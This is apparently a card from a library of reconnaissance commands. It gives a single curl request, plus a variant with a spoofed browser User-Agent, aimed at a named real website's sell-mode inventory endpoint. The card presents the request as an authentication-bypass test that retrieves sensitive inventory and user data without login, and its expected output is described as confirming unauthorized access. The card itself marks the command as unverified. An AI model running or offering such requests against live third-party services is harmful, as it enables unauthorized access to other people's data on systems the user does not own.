---
data: 'curl https://cs.money/load_sell_mode_inventory'
tags:
  - recon
  - web-access
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 7b1db1c7-0684-424d-aa73-22bb9078184c
created_at: '2025-12-14T17:30:58.955Z'
updated_at: '2025-12-14T17:30:58.955Z'
verified: false
validated: true
submitted: true
---
# curl-access-inventory-endpoint

## Command

```bash
curl https://cs.money/load_sell_mode_inventory
```

## Description

This command uses curl to perform an unauthenticated GET request to the CS Money sell mode inventory endpoint, retrieving sensitive inventory data that should require login. Use it to test for authentication bypass vulnerabilities in web APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://cs.money/load_sell_mode_inventory` | The target URL for the inventory endpoint | Yes |

## Examples

### Basic Usage

```bash
curl https://cs.money/load_sell_mode_inventory
```

### Advanced Usage

```bash
curl -H "User-Agent: Mozilla/5.0" https://cs.money/load_sell_mode_inventory | jq '.'
```

## Expected Output

A JSON response with inventory data, such as {"items": [...], "user_id": "..."}, confirming unauthorized access without errors.

## Related

- [[Related Procedure: Access-Unauthenticated-Sell-Mode-Inventory-Endpoint]]
